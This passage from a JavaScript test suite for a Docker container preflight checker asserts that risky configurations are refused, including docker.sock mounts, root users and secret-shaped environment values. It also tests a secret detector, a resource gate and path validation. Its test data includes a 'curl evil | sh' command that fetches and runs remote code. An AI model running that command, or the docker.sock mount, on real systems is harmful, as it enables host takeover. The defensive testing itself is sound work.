  ['NanoCpus string', (i) => { i.HostConfig.NanoCpus = '2000000000'; }, /cpus/],
  ['PidsLimit -1', (i) => { i.HostConfig.PidsLimit = -1; }, /pids/],
  ['PidsLimit 0', (i) => { i.HostConfig.PidsLimit = 0; }, /pids/],
  ['PidsLimit 4096', (i) => { i.HostConfig.PidsLimit = 4096; }, /pids/],
  ['OomKillDisable true', (i) => { i.HostConfig.OomKillDisable = true; }, /OOM/],
  ['Devices non-array object', (i) => { i.HostConfig.Devices = { a: 1 }; }, /device/],
  ['DeviceRequests gpu', (i) => { i.HostConfig.DeviceRequests = [{ Count: -1, Capabilities: [['gpu']] }]; }, /device requests/],
  ['DeviceCgroupRules', (i) => { i.HostConfig.DeviceCgroupRules = ['c *:* rwm']; }, /cgroup rules/],
  ['Sysctls', (i) => { i.HostConfig.Sysctls = { 'kernel.shmmax': '1' }; }, /Sysctls/],
  ['Ulimits nofile huge', (i) => { i.HostConfig.Ulimits = [{ Name: 'nofile', Soft: 1048576, Hard: 1048576 }]; }, /Ulimits/],
  ['GroupAdd root', (i) => { i.HostConfig.GroupAdd = ['0']; }, /GroupAdd/],
  ['Runtime custom', (i) => { i.HostConfig.Runtime = 'nvidia'; }, /runtime/],
  ['Runtime missing', (i) => { delete i.HostConfig.Runtime; }, /runtime/],
  ['RestartPolicy always', (i) => { i.HostConfig.RestartPolicy = { Name: 'always' }; }, /restart/],
  ['RestartPolicy missing', (i) => { delete i.HostConfig.RestartPolicy; }, /restart/],
  ['AutoRemove true', (i) => { i.HostConfig.AutoRemove = true; }, /auto-remove/],
  ['CgroupParent', (i) => { i.HostConfig.CgroupParent = '/'; }, /cgroup parent/],
  ['Binds docker.sock (HostConfig only)', (i) => { i.HostConfig.Binds = ['/var/run/docker.sock:/var/run/docker.sock']; }, /binds/],
  ['VolumesFrom', (i) => { i.HostConfig.VolumesFrom = ['other']; }, /other containers/],
  ['extra mount docker.sock', (i) => { i.Mounts.push({ Destination: '/var/run/docker.sock', Source: '/var/run/docker.sock', RW: false, Type: 'bind' }); }, /mount/],
  ['mount dst trailing slash', (i) => { i.Mounts[0].Destination = '/out/'; }, /mount/],
  ['mount Type BIND', (i) => { i.Mounts[0].Type = 'BIND'; }, /expected bind/],
  ['Mounts as object', (i) => { i.Mounts = { 0: i.Mounts[0] }; }, /mounts are unreadable/],
  ['Mounts missing', (i) => { delete i.Mounts; }, /mounts are unreadable/],
  ['Env secret', (i) => { i.Config.Env.push('GITHUB_TOKEN=ghp_' + 'x'.repeat(36)); }, /env GITHUB_TOKEN/],
  ['Env secret in an allowed name', (i) => { i.Config.Env.push('HOME=sk-' + 'Ab3'.repeat(12)); }, /secret-shaped/],
  ['Env AWS', (i) => { i.Config.Env.push('AWS_SECRET_ACCESS_KEY=abc'); }, /not allowed/],
  ['Env spec value differs', (i) => { i.Config.Env[2] = 'CI=0'; }, /env CI/],
  ['Env spec pair missing', (i) => { i.Config.Env.pop(); }, /env CI is missing/],
  ['Env set twice', (i) => { i.Config.Env.push('PATH=/tmp'); }, /twice/],
  ['Env malformed', (i) => { i.Config.Env.push('=x'); }, /malformed/],
  ['Env unreadable', (i) => { i.Config.Env = 'PATH=/bin'; }, /env is unreadable/],
  ['Cmd differs (sh -c)', (i) => { i.Config.Cmd = ['sh', '-c', 'curl evil | sh']; }, /command/],
  ['Cmd missing', (i) => { delete i.Config.Cmd; }, /command/],
  ['Entrypoint differs', (i) => { i.Config.Entrypoint = ['/bin/sh']; }, /entrypoint/],
  ['Entrypoint a string', (i) => { i.Config.Entrypoint = '/opt/nexus/nexus-entry 60 --'; }, /entrypoint/],
  ['Image unpinned', (i) => { i.Config.Image = 'node:latest'; i.Image = 'sha256:' + 'b'.repeat(64); }, /image/],
  ['Image id differs', (i) => { i.Image = 'sha256:' + 'b'.repeat(64); }, /image is/],
  ['Image missing', (i) => { delete i.Image; }, /image is/],
  ['User 0:0', (i) => { i.Config.User = '0:0'; }, /user/],
  ['User 10001', (i) => { i.Config.User = '10001'; }, /user/],
  ['User root', (i) => { i.Config.User = 'root'; }, /user/],
  ['PortBindings ::', (i) => { i.HostConfig.PortBindings = { '8080/tcp': [{ HostIp: '::', HostPort: '1' }] }; }, /port/],
  ['PortBindings udp', (i) => { i.HostConfig.PortBindings = { '53/udp': [{ HostIp: '127.0.0.1', HostPort: '53' }] }; }, /port/],
  ['PortBindings entry null', (i) => { i.HostConfig.PortBindings = { '8080/tcp': null }; }, /port/],
  ['PortBindings entry [{}]', (i) => { i.HostConfig.PortBindings = { '8080/tcp': [{}] }; }, /port/],
  ['PortBindings entry [] (empty list)', (i) => { i.HostConfig.PortBindings = { '8080/tcp': [] }; }, /port/],
  ['PortBindings a string', (i) => { i.HostConfig.PortBindings = 'x'; }, /port bindings are unreadable/],
  ['PublishAllPorts "true"', (i) => { i.HostConfig.PublishAllPorts = 'true'; }, /published/],
  ['PublishAllPorts null', (i) => { i.HostConfig.PublishAllPorts = null; }, /published/],
  ['Tmpfs /tmp exec', (i) => { i.HostConfig.Tmpfs['/tmp'] = 'rw,exec,nosuid,size=512m,uid=10001'; }, /tmpfs/],
  ['Tmpfs /tmp noexec+exec', (i) => { i.HostConfig.Tmpfs['/tmp'] = 'rw,noexec,nosuid,size=512m,uid=10001,exec'; }, /tmpfs/],
  ['Tmpfs size 512M (upper)', (i) => { i.HostConfig.Tmpfs['/tmp'] = 'rw,noexec,nosuid,size=512M,uid=10001'; }, /tmpfs/],
  ['Tmpfs /tmp/ extra', (i) => { i.HostConfig.Tmpfs['/tmp/'] = 'rw'; }, /tmpfs/],
  ['Tmpfs inherited', (i) => { i.HostConfig.Tmpfs = Object.create(i.HostConfig.Tmpfs); }, /tmpfs/],
  ['Labels inherited', (i) => { i.Config.Labels = Object.create(i.Config.Labels); }, /label/],
  ['Config.User inherited', (i) => { const { User, ...rest } = i.Config; i.Config = Object.assign(Object.create({ User }), rest); }, /Config/],
  ['HostConfig inherited Privileged', (i) => { delete i.HostConfig.Privileged; Object.setPrototypeOf(i.HostConfig, { Privileged: false }); }, /HostConfig/],
  ['a getter that throws', (i) => { Object.defineProperty(i.HostConfig, 'Memory', { get() { throw new Error('boom'); }, enumerable: true }); }, /memory/],
  ['inspect as [] empty', () => [], /0 records/],
  ['inspect number', () => 5, /inspect/],
  ['a Proxy that throws', (i) => new Proxy(i, { get() { throw new Error('trap'); }, getOwnPropertyDescriptor() { throw new Error('trap'); } }), /could not be read/],
  ['a Proxy that throws on prototype', (i) => new Proxy(i, { getPrototypeOf() { throw new Error('trap'); } }), /could not be read/]
];
for (const [name, mutate, expect] of REVIEW_BYPASSES) test(`PF3 review bypass: ${name} is refused`, () => {
  const i = good(); const r = mutate(i);
  let report;
  assert.doesNotThrow(() => { report = comparePreflight(spec, r === undefined ? i : r); });
  assert.equal(report.ok, false, `${name} passed preflight`);
  assert.ok(report.problems.some((p) => expect.test(p)), report.problems.join('; '));
});
for (const [name, mutate] of [
  ['PortBindings null', (i) => { i.HostConfig.PortBindings = null; }],
  ['PortBindings []', (i) => { i.HostConfig.PortBindings = []; }],
  ['CapDrop lowercase all', (i) => { i.HostConfig.CapDrop = ['all']; }],
  ['the source in Windows form', (i) => { i.Mounts[0].Source = 'C:\\x\\out'; }],
  ['the source with an upper-case drive in Docker Desktop form', (i) => { i.Mounts[1].Source = '/run/desktop/mnt/host/C/x/in/'; }],
  ['no-new-privileges:true', (i) => { i.HostConfig.SecurityOpt = ['no-new-privileges:true']; }],
  ['IpcMode none, CgroupnsMode empty, namespace modes absent', (i) => {
    i.HostConfig.IpcMode = 'none'; i.HostConfig.CgroupnsMode = ''; delete i.HostConfig.PidMode; delete i.HostConfig.UTSMode; delete i.HostConfig.UsernsMode; }],
  ['RestartPolicy name empty, PublishAllPorts absent, OomKillDisable null', (i) => {
    i.HostConfig.RestartPolicy = { Name: '' }; delete i.HostConfig.PublishAllPorts; i.HostConfig.OomKillDisable = null; }]
]) test(`PF3 harmless: ${name} passes`, () => {
  const i = good(); mutate(i);
  assert.deepEqual(comparePreflight(spec, i).problems, []);
});
test('PF6 the spec itself must name a digest-pinned image', () => {
  for (const ref of ['node:latest', 'nexus/sde-node', 'nexus/sde-node@sha256:abc']) {
    const s = { ...spec, image: { ref, id: IMG } }; const i = good(); i.Config.Image = ref;
    assert.ok(comparePreflight(s, i).problems.some((p) => /digest-pinned/.test(p)), ref);
  }
  const byId = { ...spec, image: { ref: IMG, id: IMG } }; const i = good(); i.Config.Image = IMG;
  assert.deepEqual(comparePreflight(byId, i).problems, [], 'a locally built image may be referenced by its id');
  const other = { ...spec, image: { ref: 'sha256:' + 'b'.repeat(64), id: IMG } }; const j = good(); j.Config.Image = other.image.ref;
  assert.ok(comparePreflight(other, j).problems.some((p) => /differs/.test(p)));
  assert.equal(comparePreflight({ ...spec, image: undefined }, good()).ok, false, 'no image in the spec fails');
});
test('PF7 dockerDesktopHostPath maps Windows paths to Docker Desktop form and refuses the rest', () => {
  const { dockerDesktopHostPath: d } = loadTs('src/shared/nexus/preflightCheck.ts');
  assert.equal(d('C:\\x\\out'), '/run/desktop/mnt/host/c/x/out');
  assert.equal(d('C:/x/out/'), '/run/desktop/mnt/host/c/x/out');
  assert.equal(d('D:\\Users\\A B'), '/run/desktop/mnt/host/d/Users/A B');
  assert.equal(d('/run/desktop/mnt/host/C/x'), '/run/desktop/mnt/host/c/x');
  assert.equal(d('/var/lib/x'), '/var/lib/x');
  for (const bad of ['', 'relative/x', 'nexus-ws-A', '\\\\server\\share', '\\\\.\\pipe\\docker_engine', 'C:\\x\\..\\y', 'C:x', '/a/\0b', 42]) {
    assert.equal(d(bad), null, JSON.stringify(bad));
  }
});
test('PF8 the secret detector flags key shapes and high-entropy tokens, not ordinary values', () => {
  const { looksSecret } = loadTs('src/shared/nexus/secretShape.ts');
  for (const s of ['ghp_' + 'a1'.repeat(18), 'AKIAABCDEFGHIJKLMNOP', 'sk-' + 'q9Z'.repeat(10), 'xoxb-123456789012-abc',
    'https://user:pass@example.test/x', '-----BEGIN RSA PRIVATE KEY-----', 'Zq8vR2mN7xL4pK9wT1yB6cH3jF5dG0sA8eU']) assert.equal(looksSecret(s), true, s);
  for (const s of ['/usr/local/bin:/usr/bin:/bin', '20.18.0', 'C.UTF-8', '1', 'a'.repeat(64), 'f'.repeat(32) + '0123456789abcdef0123456789abcdef',
    '/home/nexus', 'node_modules/.bin']) assert.equal(looksSecret(s), false, s);
});

test('G9 the gate fails closed: images are required and compared strictly; unreadable input never throws', () => {
  const r1 = evaluateGate(probe, 50 * GIB, [{ profile: 'sde-node', present: 'no', digestMatches: 'no' }]);
  assert.deepEqual(r1.problems, [{ id: 'image_missing', profile: 'sde-node' }]);
  const r2 = evaluateGate(probe, 50 * GIB, [{ profile: 'sde-node', present: true, digestMatches: 1 }]);
  assert.deepEqual(r2.problems, [{ id: 'image_mismatch', profile: 'sde-node' }]);
  for (const images of [null, undefined, 'sde-node', { 0: 1 }]) {
    let r; assert.doesNotThrow(() => { r = evaluateGate(probe, 50 * GIB, images); });
    assert.equal(r.gate, 'below_required'); assert.deepEqual(r.problems, [{ id: 'images_unreadable' }]);
  }
  assert.equal(evaluateGate(probe, 50 * GIB, [null]).gate, 'below_required');
  const getter = { get docker() { throw new Error('x'); } };
  let r3; assert.doesNotThrow(() => { r3 = evaluateGate(getter, 50 * GIB, []); });
  assert.equal(r3.gate, 'below_required');
  const trap = new Proxy({}, { getOwnPropertyDescriptor() { throw new Error('trap'); } });
  assert.deepEqual(evaluateGate(trap, 50 * GIB, []), { gate: 'below_required', problems: [{ id: 'probe_unreadable' }] });
  assert.equal(evaluateGate(null, 50 * GIB, []).gate, 'below_required');
  assert.equal(evaluateGate({ ...probe, docker: 'RUNNING' }, 50 * GIB, []).gate, 'below_required');
});
test('G10 the 30–40 GiB band carries an advisory disk_below_recommended with numbers; it never blocks', () => {
  const r = evaluateGate(probe, 35 * GIB, []);
  assert.equal(r.gate, 'below_recommended');
  assert.deepEqual(r.problems, [{ id: 'disk_below_recommended', freeBytes: 35 * GIB, recommendedBytes: 40 * GIB, advisory: true }]);
  assert.equal(gateMod.isAdvisory(r.problems[0]), true);
  const both = evaluateGate({ ...probe, docker: 'stopped' }, 35 * GIB, []);
  assert.equal(both.gate, 'below_required');
  assert.deepEqual(both.problems.map((p) => p.id), ['disk_below_recommended', 'docker_stopped']);
  assert.equal(evaluateGate(probe, 18e9, []).problems.some((p) => p.id === 'disk_below_recommended'), false);
});

test('RP7 output paths: no colon, control character, device name or trailing dot or space', () => {
  const withPath = (relPath) => { const m = clone(SAMPLES['attempt.exited']); m.outputs[0].relPath = relPath; return m; };
  for (const p of ['a.txt:stream', 'CON', 'con.txt', 'dist/NUL', 'LPT9.log', 'com1.tar.gz', 'aux', 'a/..../b', 'a/b.', 'a /b',
    'a\x01b', 'a\x7fb', 'a\tb', '.', '..', 'x/.']) {
    assert.equal(parseRunnerMessage(withPath(p)), null, JSON.stringify(p));
  }
  for (const p of ['dist/app.js', 'console.log', 'CONFIG', 'com10.txt', 'a/.hidden', 'reports/junit.xml', 'a b/c']) {
    assert.ok(parseRunnerMessage(withPath(p)), JSON.stringify(p));
  }
});
test('RP8 text refuses NUL and lone surrogates; well-formed pairs are fine', () => {
  for (const m of ['a\0b', '\ud800', 'x\udc00', '\ud800x']) assert.equal(parseRunnerMessage({ op: 'fault', message: m }), null, JSON.stringify(m));
  assert.ok(parseRunnerMessage({ op: 'fault', message: 'ok \ud83d\ude00' }));
  const n = clone(SAMPLES['attempt.exited']); n.parsed[0].normalized = { ['k\0']: 1 };
  assert.equal(parseRunnerMessage(n), null, 'a NUL in a normalized key');
  assert.ok(parseRunnerMessage(Object.freeze({ op: 'fault', message: 'x' })), 'a frozen plain object is fine');
});
test('RP9 attempt.provisioned: a container needs its preflight, and a pass needs a complete observed record', () => {
  const full = comparePreflight(spec, good());
  assert.equal(full.ok, true);
  const ok = { op: 'attempt.provisioned', attemptId: ULID, containerId: CID, preflight: full };
  assert.ok(parseRunnerMessage(ok));
  assert.equal(parseRunnerMessage({ ...ok, preflight: { ok: true, observed: {}, problems: [] } }), null, 'a pass with nothing observed');
  const partial = clone(full); delete partial.observed.mounts;
  assert.equal(parseRunnerMessage({ ...ok, preflight: partial }), null, 'a pass missing one observed field');
  assert.equal(parseRunnerMessage({ op: 'attempt.provisioned', attemptId: ULID, containerId: CID }), null, 'a container without preflight');
  assert.equal(parseRunnerMessage({ op: 'attempt.provisioned', attemptId: ULID, preflight: full }), null, 'a preflight without a container');
  assert.ok(parseRunnerMessage({ op: 'attempt.provisioned', attemptId: ULID }), 'an engine attempt has neither');
  assert.ok(parseRunnerMessage({ ...ok, preflight: { ok: false, observed: {}, problems: ['x'] } }), 'a refusal may be partial');
});
